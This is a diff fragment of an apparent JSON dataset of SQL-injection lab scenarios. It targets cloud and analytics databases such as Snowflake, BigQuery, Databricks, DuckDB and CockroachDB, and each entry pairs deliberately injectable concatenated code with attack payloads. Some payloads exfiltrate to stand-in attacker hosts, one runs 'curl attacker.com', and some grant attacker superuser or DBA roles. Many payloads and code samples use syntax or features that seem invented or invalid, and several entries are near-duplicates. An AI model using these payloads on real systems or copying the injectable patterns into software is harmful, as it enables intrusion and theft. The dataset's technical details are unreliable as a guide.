+                    "date='2023-01-01')) UNION SELECT * FROM sys.sql_logins--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Databricks SQL Alias Expressions",
+                  "Lab Description": "A dashboard tool creates column aliases with dynamic expressions. The alias definitions are concatenated directly into query execution.",
+                  "Difficulty Level": "Easy",
+                  "Solution Steps": [
+                    "Identify column aliases",
+                    "Inject through AS clauses",
+                    "Bypass alias validation",
+                    "Access unauthorized columns",
+                    "Exfiltrate via renamed columns"
+                  ],
+                  "Vulnerability name": "Databricks Alias Injection",
+                  "srcCode": "SELECT col1 AS '\\'' + userAlias + '\\'' FROM table",
+                  "payloads": [
+                                "legit_name\") FROM system.information_schema.columns--",
+                                "malicious' FROM (SELECT * FROM hive_metastore.default.secrets)--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Amazon Redshift Spectrum External Table Locations",
+                  "Lab Description": "A data lake query system creates Spectrum tables with dynamic S3 paths. The location strings are concatenated directly into external table definitions.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify CREATE EXTERNAL TABLE",
+                    "Inject through LOCATION clauses",
+                    "Bypass IAM validation",
+                    "Access unauthorized buckets",
+                    "Exfiltrate via S3"
+                  ],
+                  "Vulnerability name": "Redshift Spectrum Location Injection",
+                  "srcCode": "CREATE EXTERNAL TABLE spectrum_table (col1 INT) LOCATION '\\'' + userPath + '\\''",
+                  "payloads": [
+                    "s3://legit-bucket/path') FROM svv_external_tables--",
+                    "s3://attacker/exfil')) WITH (format='PARQUET')"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Google Cloud Spanner Foreign Key Constraints",
+                  "Lab Description": "A schema migration tool adds foreign keys with dynamic constraint checks. The constraint clauses are concatenated directly into DDL.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify ALTER TABLE ADD CONSTRAINT",
+                    "Inject through FOREIGN KEY clauses",
+                    "Bypass referential validation",
+                    "Disable constraint checking",
+                    "Corrupt relationships"
+                  ],
+                  "Vulnerability name": "Spanner FK Constraint Injection",
+                  "srcCode": "ALTER TABLE child ADD CONSTRAINT fk_name FOREIGN KEY ('\\'' + userColumn + '\\'') REFERENCES parent(col)",
+                  "payloads": [
+                      "id\") FROM information_schema.referential_constraints--",
+                      "fake_col'))) ON DELETE CASCADE"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Azure Data Explorer Kusto Function Defaults",
+                  "Lab Description": "A KQL query system creates functions with dynamic default parameters. The default expressions are concatenated directly into function execution.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify .create function usage",
+                    "Inject through default values",
+                    "Bypass parameter validation",
+                    "Access unauthorized data",
+                    "Execute arbitrary KQL"
+                  ],
+                  "Vulnerability name": "Kusto Function Default Injection",
+                  "srcCode": ".create function my_func(p:string = '\\'' + userDefault + '\\'') { ... }",
+                  "payloads": [
+                    "test') FROM .show functions--",
+                    "' || cluster('attacker').database('exfil').table('dump') || '"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Connection Strings",
+                  "Lab Description": "An analytics tool builds ODBC connections with dynamic properties. The connection strings are concatenated directly into driver initialization.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify ODBC connection points",
+                    "Inject through connection properties",
+                    "Bypass driver validation",
+                    "Access restricted indices",
+                    "Exfiltrate via driver errors"
+                  ],
+                  "Vulnerability name": "Elasticsearch ODBC Injection",
+                  "srcCode": "Driver={{Elasticsearch ODBC}};Server='\\'' + userServer + '\\'';Properties='\\'' + userProps + '\\''",
+                  "payloads": [
+                    "attacker.com;UID=admin;PWD=' OR 1=1 --",
+                    "legit.com:9200\";SSL=1;SSLCertAuth=0;"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Escaping",
+                  "Lab Description": "A dashboard builder dynamically escapes Druid SQL identifiers. The escape sequences are concatenated directly into query planning.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify dynamic identifier usage",
+                    "Inject through escape sequences",
+                    "Bypass SQL parser validation",
+                    "Access system metadata tables",
+                    "Execute native Druid queries"
+                  ],
+                  "Vulnerability name": "Druid Identifier Escape Injection",
+                  "srcCode": "SELECT * FROM \"\\'' + userTable + '\\''",
+                  "payloads": [
+                    "datasource\\\" FROM (SELECT * FROM sys.segments) x--",
+                    "legit_table\\\" WHERE __time > 0) UNION SELECT 1,2,3--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in InfluxDB Flux String Interpolation",
+                  "Lab Description": "A monitoring system builds Flux queries with dynamic string interpolation. The template strings are concatenated directly into pipeline construction.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify string interpolation points",
+                    "Inject through template literals",
+                    "Bypass Flux validation",
+                    "Modify query logic",
+                    "Access system buckets"
+                  ],
+                  "Vulnerability name": "Flux Interpolation Injection",
+                  "srcCode": "from(bucket: \"metrics\") |> filter(fn: (r) => \"\\'' + userFilter + '\\''\")",
+                  "payloads": [
+                    "r._value > 0\") FROM (SELECT * FROM sql_metrics)--",
+                    "1==1) UNION SELECT * FROM _internal.monitor--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in TimescaleDB Continuous Aggregate Policies",
+                  "Lab Description": "A time-series platform configures continuous aggregates with dynamic refresh policies. The policy parameters are concatenated directly into materialized view maintenance.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify add_continuous_aggregate_policy",
+                    "Inject through schedule parameters",
+                    "Trigger materialization jobs",
+                    "Bypass time bucket validation",
+                    "Compromise hypertable data"
+                  ],
+                  "Vulnerability name": "Timescale Policy Injection",
+                  "srcCode": "SELECT add_continuous_aggregate_policy('\\'' + userView + '\\'', '\\'' + userInterval + '\\'')",
+                  "payloads": [
+                    "my_view', INTERVAL '1 hour')) FROM _timescaledb_catalog.hypertable--",
+                    "sensitive_view', INTERVAL '1 day'))) RETURNING *--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in CockroachDB Changefeed Filters",
+                  "Lab Description": "A CDC pipeline creates changefeeds with dynamic filter expressions. The filters are concatenated directly into change event generation.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify changefeed creation",
+                    "Inject through filter parameter",
+                    "Trigger change events",
+                    "Bypass CDC validation",
+                    "Exfiltrate via webhook payloads"
+                  ],
+                  "Vulnerability name": "CockroachCDC Filter Injection",
+                  "srcCode": "CREATE CHANGEFEED FOR TABLE users WITH filter = '\\'' + userFilter + '\\''",
+                  "payloads": [
+                    "SELECT * FROM users WHERE type = 'admin'--",
+                    "SELECT *, (SELECT version()) FROM users--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
+                  "Lab Description": "A data pipeline configures DuckDB's S3 extension with dynamic endpoints. The connection strings are concatenated directly into cloud storage operations.",
+                  "Difficulty Level": "Easy",
+                  "Solution Steps": [
+                    "Identify S3 configuration points",
+                    "Inject through endpoint parameters",
+                    "Bypass URL validation",
+                    "Modify remote data access",
+                    "Exfiltrate credentials"
+                  ],
+                  "Vulnerability name": "DuckDB S3 Endpoint Injection",
+                  "srcCode": "SET s3_endpoint='\\'' + userEndpoint + '\\''",
+                  "payloads": [
+                    "attacker.com') FROM (SELECT * FROM duckdb_settings)--",
+                    "legit.s3.amazonaws.com'; COPY (SELECT * FROM sqlite_master) TO 's3://exfil/'--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
+                  "Lab Description": "A data warehouse creates materialized views with dynamic data loading options. The WITH clauses are concatenated directly into view creation.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify materialized view creation",
+                    "Inject through WITH DATA parameter",
+                    "Trigger view population",
+                    "Bypass data validation",
+                    "Modify view contents"
+                  ],
+                  "Vulnerability name": "Materialized View Data Clause Injection",
+                  "srcCode": "CREATE MATERIALIZED VIEW mv AS SELECT * FROM source ('\\'' + userDataOption + '\\'')",
+                  "payloads": [
+                    "WITH NO DATA) FROM (SELECT * FROM pg_matviews) x--",
+                    "WITH DATA) WHERE 1=0 UNION SELECT 1,2,3--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
+                  "Lab Description": "A blockchain application uses SQL Server Ledger with dynamic view parameters. The options are concatenated directly into ledger view creation.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify ledger view creation",
+                    "Inject through view options",
+                    "Trigger ledger verification",
+                    "Bypass blockchain validation",
+                    "Modify historical records"
+                  ],
+                  "Vulnerability name": "SQL Ledger View Injection",
+                  "srcCode": "CREATE LEDGER VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\'' + userOptions + '\\'')",
+                  "payloads": [
+                    "VERIFICATION = ON) FROM (SELECT * FROM sys.database_principals) x--",
+                    "TRANSACTION_ID_COLUMN = id) WHERE 1=0 UNION SELECT 1--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Google BigQuery Wildcard Table Patterns",
+                  "Lab Description": "A data analytics tool uses BigQuery wildcard tables with dynamic patterns. The table patterns are concatenated directly into FROM clauses.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify wildcard table usage",
+                    "Inject through table pattern",
+                    "Bypass pattern validation",
+                    "Access unauthorized datasets",
+                    "Exfiltrate via table expansion"
+                  ],
+                  "Vulnerability name": "BigQuery Wildcard Injection",
+                  "srcCode": "SELECT * FROM `project.dataset.\\'' + userPattern + '\\'`",
+                  "payloads": [
+                    "table_*` FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
+                    "legit_table` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
+                  "Lab Description": "A Databricks environment configures SQL warehouses with dynamic parameters. The configuration strings are concatenated directly into warehouse creation.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify warehouse creation endpoints",
+                    "Inject through config parameters",
+                    "Trigger warehouse startup",
+                    "Bypass config validation",
+                    "Access metastore via driver nodes"
+                  ],
+                  "Vulnerability name": "Databricks Warehouse Config Injection",
+                  "srcCode": "CREATE WAREHOUSE my_warehouse WITH ('\\'' + userConfig + '\\'')",
+                  "payloads": [
+                    "AUTO_STOP = 1200) FROM (SELECT * FROM system.metastore.tables)--",
+                    "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Trino Function Namespace Paths",
+                  "Lab Description": "A Trino cluster creates functions with dynamic namespace paths. The namespace strings are concatenated directly into function registration.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify function creation endpoints",
+                    "Inject through namespace parameters",
+                    "Trigger function execution",
+                    "Bypass namespace validation",
+                    "Access system functions"
+                  ],
+                  "Vulnerability name": "Trino Function Namespace Injection",
+                  "srcCode": "CREATE FUNCTION '\\'' + userNamespace + '\\''.my_func() RETURNS STRING",
+                  "payloads": [
+                    "system', 'return 1') FROM (SELECT * FROM system.metadata.catalogs)--",
+                    "pg_catalog', 'SELECT * FROM pg_user')--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in Presto Table Function Arguments",
+                  "Lab Description": "A Presto cluster uses table functions with dynamic arguments. The argument strings are concatenated directly into function calls.",
+                  "Difficulty Level": "Hard",
+                  "Solution Steps": [
+                    "Identify table function usage",
+                    "Inject through function arguments",
+                    "Bypass argument validation",
+                    "Modify generated table contents",
+                    "Access system tables via function errors"
+                  ],
+                  "Vulnerability name": "Presto Table Function Injection",
+                  "srcCode": "SELECT * FROM TABLE(system.query(query => '\\'' + userQuery + '\\''))",
+                  "payloads": [
+                    "SELECT 1')) FROM (SELECT * FROM system.runtime.nodes)--",
+                    "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
+                  ]
+                },
+                {
+                  "Lab scenario": "SQL Injection in ClickHouse Dictionary Source URLs",
+                  "Lab Description": "A ClickHouse cluster configures external dictionaries with dynamic source URLs. The URLs are concatenated directly into dictionary definitions.",
+                  "Difficulty Level": "Medium",
+                  "Solution Steps": [
+                    "Identify dictionary creation",
+                    "Inject through source URL parameters",
+                    "Trigger dictionary reload",
+                    "Bypass URL validation",
+                    "Modify dictionary contents"
+                  ],
+                  "Vulnerability name": "ClickHouse Dictionary URL Injection",
+                  "srcCode": "CREATE DICTIONARY my_dict (SOURCE(HTTP(URL '\\'' + userUrl + '\\'')))",
+                  "payloads": [
+                    "http://attacker.com/payload')) FROM (SELECT * FROM system.dictionaries)--",
+                    "https://legit.com/data.json')) WHERE 1=0 UNION SELECT 1--"
+                  ]
+                },
+
+
+
+
+
+
+                
+                    {
+                      "Lab scenario": "SQL Injection in PostgreSQL CREATE COLLATION Locale",
+                      "Lab Description": "A multilingual app creates custom collations with dynamic locale strings. The locale parameters are concatenated directly into collation definitions.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify CREATE COLLATION usage",
+                        "Inject through locale parameter",
+                        "Bypass locale validation",
+                        "Trigger collation corruption",
+                        "Exfiltrate via string comparisons"
+                      ],
+                      "Vulnerability name": "PostgreSQL Collation Injection",
+                      "srcCode": "CREATE COLLATION my_coll (LOCALE = '\\'' + userLocale + '\\'')",
+                      "payloads": [
+                        "en_US.utf8') FROM pg_collation--",
+                        "C')); CREATE ROLE attacker SUPERUSER--"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in MySQL Clone Plugin Data Filtering",
+                      "Lab Description": "A database cloning tool uses dynamic filters during clone operations. The filter conditions are concatenated directly into clone statements.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify CLONE INSTANCE usage",
+                        "Inject through DATA FILTER clauses",
+                        "Bypass clone validation",
+                        "Access source server data",
+                        "Tamper with cloned content"
+                      ],
+                      "Vulnerability name": "MySQL Clone Filter Injection",
+                      "srcCode": "CLONE INSTANCE FROM user@host DATA FILTER = '\\'' + userFilter + '\\''",
+                      "payloads": [
+                        "EXCLUDE_SCHEMAS: ['mysql'] FROM clone_progress--",
+                        "INCLUDE_TABLES: ['sensitive.%']))--"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in SQL Server Ledger History Retention",
+                      "Lab Description": "A blockchain system configures ledger history with dynamic retention periods. The retention clauses are concatenated directly into immutable storage.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify ALTER LEDGER usage",
+                        "Inject through retention parameters",
+                        "Bypass blockchain validation",
+                        "Purge historical records",
+                        "Tamper with audit trails"
+                      ],
+                      "Vulnerability name": "SQL Ledger Retention Injection",
+                      "srcCode": "ALTER LEDGER ledger_name SET (LEDGER_RETENTION = '\\'' + userRetention + '\\'')",
+                      "payloads": [
+                        "INFINITE') FROM sys.ledger_blocks--",
+                        "0 DAYS'))) WITH (VERIFICATION = OFF)"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Oracle SDO_NET Memory Parameters",
+                      "Lab Description": "A network analysis tool configures spatial networks with dynamic memory settings. The parameter strings are concatenated directly into network creation.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify SDO_NET.CREATE_NETWORK",
+                        "Inject through memory parameters",
+                        "Bypass SGA validation",
+                        "Trigger buffer overflows",
+                        "Execute arbitrary PL/SQL"
+                      ],
+                      "Vulnerability name": "Oracle SDO_NET Injection",
+                      "srcCode": "BEGIN SDO_NET.CREATE_NETWORK('\\'' + userParams + '\\''); END;",
+                      "payloads": [
+                        "network_name, no_of_nodes, no_of_links, no_of_paths, no_of_pathtables FROM user_sdo_networks--",
+                        "malicious_net')); EXECUTE IMMEDIATE 'GRANT DBA TO attacker'--"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Snowflake External Table Refresh Paths",
+                      "Lab Description": "A cloud pipeline refreshes external tables with dynamic storage paths. The path strings are concatenated directly into metadata updates.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify ALTER EXTERNAL TABLE REFRESH",
+                        "Inject through location parameters",
+                        "Bypass path validation",
+                        "Access unauthorized storage",
+                        "Poison metadata cache"
+                      ],
+                      "Vulnerability name": "Snowflake External Path Injection",
+                      "srcCode": "ALTER EXTERNAL TABLE ext_table REFRESH '\\'' + userPath + '\\''",
+                      "payloads": [
+                        "s3://legit/path') FROM information_schema.external_tables--",
+                        "azure://attacker/exfil')) LIST @~/staged"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in BigQuery Remote Model Connection Strings",
+                      "Lab Description": "A machine learning system creates remote models with dynamic connections. The connection strings are concatenated directly into model inference.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify CREATE MODEL usage",
+                        "Inject through CONNECTION parameters",
+                        "Bypass IAM validation",
+                        "Access Vertex AI endpoints",
+                        "Execute arbitrary predictions"
+                      ],
+                      "Vulnerability name": "BigQuery Model Connection Injection",
+                      "srcCode": "CREATE MODEL `project.model` REMOTE WITH CONNECTION `\\'' + userConn + '\\''",
+                      "payloads": [
+                        "us.my-connection') FROM `region-us`.INFORMATION_SCHEMA.ROUTINES--",
+                        "attacker-proj.us.conn` OPTIONS (endpoint='attacker.com')"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Azure Synapse Spark Notebook Magic Parameters",
+                      "Lab Description": "A Synapse notebook uses dynamic parameters in magic commands. The values are concatenated directly into command execution.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify magic command usage (%sql, %python)",
+                        "Inject through parameter placeholders",
+                        "Bypass notebook sanitization",
+                        "Execute cross-language code",
+                        "Access linked services"
+                      ],
+                      "Vulnerability name": "Synapse Magic Command Injection",
+                      "srcCode": "%sql SELECT * FROM table WHERE id = '\\'' + userParam + '\\''",
+                      "payloads": [
+                        "1' UNION SELECT * FROM sensitive_table--",
+                        "' || (SELECT TOP 1 name FROM sys.sql_logins) || '"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Amazon Redshift ML Model Hyperparameters",
+                      "Lab Description": "A predictive analytics system trains ML models with dynamic hyperparameters. The parameter strings are concatenated directly into model creation.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify CREATE MODEL usage",
+                        "Inject through HPARAMETERS clauses",
+                        "Bypass SageMaker validation",
+                        "Access training data",
+                        "Manipulate model behavior"
+                      ],
+                      "Vulnerability name": "Redshift ML Hyperparameter Injection",
+                      "srcCode": "CREATE MODEL model_name HPARAMETERS ('\\'' + userParams + '\\'') AS SELECT...",
+                      "payloads": [
+                        "max_depth=5) FROM svv_ml_models--",
+                        "objective='binary:logistic'))) FROM (SELECT * FROM pg_user)"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Google Cloud Spanner Change Stream Value Capture",
+                      "Lab Description": "A CDC system configures change streams with dynamic value capture. The capture clauses are concatenated directly into stream creation.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify CREATE CHANGE STREAM",
+                        "Inject through VALUE_CAPTURE_TYPE",
+                        "Bypass stream validation",
+                        "Access unauthorized changes",
+                        "Tamper with captured values"
+                      ],
+                      "Vulnerability name": "Spanner Value Capture Injection",
+                      "srcCode": "CREATE CHANGE STREAM stream FOR TABLE table_name VALUE_CAPTURE_TYPE '\\'' + userCapture + '\\''",
+                      "payloads": [
+                        "OLD_AND_NEW_VALUES') FROM information_schema.change_streams--",
+                        "NEW_VALUES'))) FOR ALL"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Databricks Unity Catalog Sharing Recipients",
+                      "Lab Description": "A data sharing platform configures Delta Sharing with dynamic recipient emails. The email strings are concatenated directly into ACL management.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify CREATE SHARE usage",
+                        "Inject through TO: parameters",
+                        "Bypass email validation",
+                        "Access unauthorized shares",
+                        "Exfiltrate via sharing notifications"
+                      ],
+                      "Vulnerability name": "Unity Catalog Sharing Injection",
+                      "srcCode": "ALTER SHARE my_share ADD TO '\\'' + userEmail + '\\''",
+                      "payloads": [
+                        "attacker@domain.com') FROM (SELECT * FROM system.information_schema.shares)--",
+                        "legit@company.com'; SELECT * FROM hive_metastore.sensitive.tbl--"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Snowpark Java UDF Class Paths",
+                      "Lab Description": "A Snowpark app registers Java UDFs with dynamic classpaths. The path strings are concatenated directly into JAR loading.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify CREATE FUNCTION usage",
+                        "Inject through IMPORTS clauses",
+                        "Bypass JAR validation",
+                        "Load malicious classes",
+                        "Execute arbitrary Java"
+                      ],
+                      "Vulnerability name": "Snowpark Java UDF Injection",
+                      "srcCode": "CREATE FUNCTION my_func() RETURNS STRING LANGUAGE JAVA IMPORTS = ('\\'' + userJar + '\\'')",
+                      "payloads": [
+                        "attacker.com/malicious.jar') FROM information_schema.functions--",
+                        "s3://exfil/exploit.jar'))) HANDLER='MaliciousClass'"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Azure Cosmos DB Stored Procedure Continuations",
+                      "Lab Description": "A NoSQL application builds Cosmos DB stored procedures with dynamic continuation tokens. The token strings are concatenated directly into pagination logic.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify stored procedure execution",
+                        "Inject through continuationToken",
+                        "Bypass query limits",
+                        "Access unauthorized partitions",
+                        "Exfiltrate via pagination"
+                      ],
+                      "Vulnerability name": "CosmosDB Continuation Injection",
+                      "srcCode": "function queryDocs(continuationToken) { var response = __.queryDocuments(\\'' + userQuery + '\\'', { continuation: '\\'' + userToken + '\\'' }); }",
+                      "payloads": [
+                        "attacker-token') FROM c WHERE c._ts > 0--",
+                        "malicious' })); function() { return __.queryDocuments(__.getSelfLink()) }--"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Properties",
+                      "Lab Description": "An analytics tool builds ODBC connections with dynamic properties. The property strings are concatenated directly into driver initialization.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify ODBC connection points",
+                        "Inject through connection properties",
+                        "Bypass driver validation",
+                        "Access restricted indices",
+                        "Exfiltrate via driver errors"
+                      ],
+                      "Vulnerability name": "Elasticsearch ODBC Property Injection",
+                      "srcCode": "Driver={{Elasticsearch ODBC}};Server='\\'' + userServer + '\\'';Properties='\\'' + userProps + '\\''",
+                      "payloads": [
+                        "attacker.com;UID=admin;PWD=' OR 1=1 --",
+                        "legit.com:9200\";SSL=1;SSLCertAuth=0;"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Case Forcing",
+                      "Lab Description": "A dashboard tool forces identifier case with dynamic expressions. The case operations are concatenated directly into query planning.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify case manipulation",
+                        "Inject through case expressions",
+                        "Bypass parser validation",
+                        "Access system tables",
+                        "Execute native queries"
+                      ],
+                      "Vulnerability name": "Druid Case Forcing Injection",
+                      "srcCode": "SELECT * FROM '\\'' + userTable + '\\''",
+                      "payloads": [
+                        "datasource FROM (SELECT * FROM sys.segments) --",
+                        "SENSITIVE_DATA\" WHERE __time > 0) UNION SELECT 1 --"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in InfluxDB Flux HTTP Request Headers",
+                      "Lab Description": "A monitoring system builds Flux HTTP requests with dynamic headers. The header strings are concatenated directly into pipeline execution.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify http.get/post calls",
+                        "Inject through header parameters",
+                        "Bypass header validation",
+                        "Access internal endpoints",
+                        "Exfiltrate via HTTP responses"
+                      ],
+                      "Vulnerability name": "Flux HTTP Header Injection",
+                      "srcCode": "import \"http\" http.get(url: 'url', headers: '\\'' + userHeaders + '\\'')",
+                      "payloads": [
+                        "{'X-Auth': 'attacker'} FROM _internal.monitor--",
+                        "{'Authorization': 'Bearer ${string(v: r._value)}'}"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in TimescaleDB Compression Segmentby Columns",
+                      "Lab Description": "A time-series database enables compression with dynamic segmentby columns. The column lists are concatenated directly into compression policies.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify ALTER TABLE SET compression",
+                        "Inject through segmentby parameters",
+                        "Bypass column validation",
+                        "Access compressed chunks",
+                        "Manipulate compression ratios"
+                      ],
+                      "Vulnerability name": "Timescale Compression Injection",
+                      "srcCode": "ALTER TABLE hypertable SET (timescaledb.compress, timescaledb.compress_segmentby = '\\'' + userColumns + '\\'')",
+                      "payloads": [
+                        "device_id') FROM _timescaledb_catalog.hypertable --",
+                        "time DESC')) WITH (compress_orderby = 'time DESC')"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in CockroachDB CDC Webhook Headers",
+                      "Lab Description": "A change data capture system configures webhooks with dynamic headers. The header values are concatenated directly into HTTP requests.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify CREATE CHANGEFEED WITH webhook",
+                        "Inject through header parameters",
+                        "Bypass header validation",
+                        "Access webhook endpoints",
+                        "Exfiltrate via custom headers"
+                      ],
+                      "Vulnerability name": "Cockroach Webhook Header Injection",
+                      "srcCode": "CREATE CHANGEFEED FOR TABLE table INTO 'webhook-https://endpoint' WITH webhook_headers = '\\'' + userHeaders + '\\''",
+                      "payloads": [
+                        "'X-Auth: attacker'",
+                        "'{\"Authorization\": \"Bearer $(curl attacker.com)\"}'"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in DuckDB HTTPFS Extension Headers",
+                      "Lab Description": "A data pipeline uses DuckDB's HTTPFS with dynamic request headers. The header strings are concatenated directly into HTTP operations.",
+                      "Difficulty Level": "Medium",
+                      "Solution Steps": [
+                        "Identify HTTPFS usage",
+                        "Inject through header parameters",
+                        "Bypass header validation",
+                        "Access restricted URLs",
+                        "Exfiltrate via server responses"
+                      ],
+                      "Vulnerability name": "DuckDB HTTPFS Header Injection",
+                      "srcCode": "SET http_headers = '\\'' + userHeaders + '\\''",
+                      "payloads": [
+                        "'Authorization: Basic YWRtaW46cGFzcw=='",
+                        "'X-Forwarded-For: 127.0.0.1'"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
+                      "Lab Description": "A data warehouse refreshes materialized views with dynamic data options. The WITH clauses are concatenated directly into refresh operations.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify REFRESH MATERIALIZED VIEW",
+                        "Inject through WITH DATA parameter",
+                        "Bypass refresh validation",
+                        "Trigger full data reload",
+                        "Access underlying tables"
+                      ],
+                      "Vulnerability name": "Materialized View Refresh Injection",
+                      "srcCode": "REFRESH MATERIALIZED VIEW mv WITH ('\\'' + userOption + '\\'')",
+                      "payloads": [
+                        "DATA) FROM pg_matviews --",
+                        "NO DATA')) CONCURRENTLY"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in SQL Ledger History Retention",
+                      "Lab Description": "A blockchain application configures ledger history with dynamic retention. The retention clauses are concatenated directly into blockchain maintenance.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify ALTER LEDGER usage",
+                        "Inject through retention parameters",
+                        "Bypass blockchain validation",
+                        "Tamper with historical records",
+                        "Disable immutable logging"
+                      ],
+                      "Vulnerability name": "SQL Ledger Retention Injection",
+                      "srcCode": "ALTER LEDGER ledger SET (LEDGER_VIEW_RETENTION = '\\'' + userRetention + '\\'')",
+                      "payloads": [
+                        "INFINITE') FROM sys.ledger_blocks --",
+                        "0 DAYS'))) WITH (VERIFICATION = OFF)"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in BigQuery Remote Model Connection Strings",
+                      "Lab Description": "A machine learning system creates remote models with dynamic connections. The connection strings are concatenated directly into model inference.",
+                      "Difficulty Level": "Easy",
+                      "Solution Steps": [
+                        "Identify CREATE MODEL usage",
+                        "Inject through CONNECTION parameters",
+                        "Bypass IAM validation",
+                        "Access Vertex AI endpoints",
+                        "Execute arbitrary predictions"
+                      ],
+                      "Vulnerability name": "BigQuery Model Connection Injection",
+                      "srcCode": "CREATE MODEL `project.model` REMOTE WITH CONNECTION `\\'' + userConn + '\\''",
+                      "payloads": [
+                        "us.my-connection') FROM `region-us`.INFORMATION_SCHEMA.ROUTINES --",
+                        "attacker-proj.us.conn` OPTIONS (endpoint='attacker.com')"
+                      ]
+                    },
+                    {
+                      "Lab scenario": "SQL Injection in Snowflake External Function Response Transformers",
+                      "Lab Description": "A cloud integration processes external function responses with dynamic transformers. The JavaScript code is concatenated directly into result handling.",
+                      "Difficulty Level": "Hard",
+                      "Solution Steps": [
+                        "Identify CREATE EXTERNAL FUNCTION",
+                        "Inject through RESPONSE_TRANSFORMER",
+                        "Bypass sandbox restrictions",
+                        "Modify returned data",
+                        "Execute arbitrary SQL"
+                      ],
+                      "Vulnerability name": "Snowflake Response Transformer Injection",
+                      "srcCode": "CREATE EXTERNAL FUNCTION func() RETURNS VARIANT RESPONSE_TRANSFORMER = '\\'' + userTransformer + '\\''",
+                      "payloads": [
+                        "function transform(res) { return {sqlText: 'SELECT * FROM sensitive_table'}; }",
